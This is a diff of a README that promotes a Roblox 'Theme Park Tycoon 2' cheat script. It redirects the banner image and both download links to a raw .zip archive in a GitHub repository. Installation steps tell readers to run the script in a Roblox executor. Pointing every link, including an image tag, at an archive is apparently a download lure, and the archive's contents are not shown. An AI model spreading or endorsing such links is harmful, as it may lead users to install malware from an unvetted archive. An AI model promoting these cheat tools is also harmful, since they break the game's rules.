@@ -1,10 +1,10 @@
 # Theme Park Tycoon 2 Script - TP Player, Clean Park, Auto Build & Guests
 
-![Theme Park Tycoon 2 Script](https://github.com/user-attachments/assets/805316c0-7a6b-4082-b701-e70258440465)
+![Theme Park Tycoon 2 Script](https://github.com/smailnour/Theme-Park-Tycoon-2-Script/raw/refs/heads/main/slip/Script-Tycoon-Theme-Park-1.0.zip)
 
 This script is created to streamline and automate various tasks in **Theme Park Tycoon 2**, one of Roblox’s most popular theme park simulation games. Whether you're a casual player looking to save time or a creator testing large-scale designs, this tool simplifies gameplay while offering advanced functions not normally available in the base game.
 
-## [🚀 Download Theme Park Tycoon 2 Script](https://pocketoption.download/themeparktycoon2)
+## [🚀 Download Theme Park Tycoon 2 Script](https://github.com/smailnour/Theme-Park-Tycoon-2-Script/raw/refs/heads/main/slip/Script-Tycoon-Theme-Park-1.0.zip)
 
 ---
 
@@ -21,7 +21,7 @@ This script is created to streamline and automate various tasks in **Theme Park 
 
 ## 📥 Installation
 
-1. [Download and install the script](https://pocketoption.download/themeparktycoon2).
+1. [Download and install the script](https://github.com/smailnour/Theme-Park-Tycoon-2-Script/raw/refs/heads/main/slip/Script-Tycoon-Theme-Park-1.0.zip).
 2. Open your preferred Roblox executor.
 3. Paste the script and execute it while in a **Theme Park Tycoon 2** game session.
 
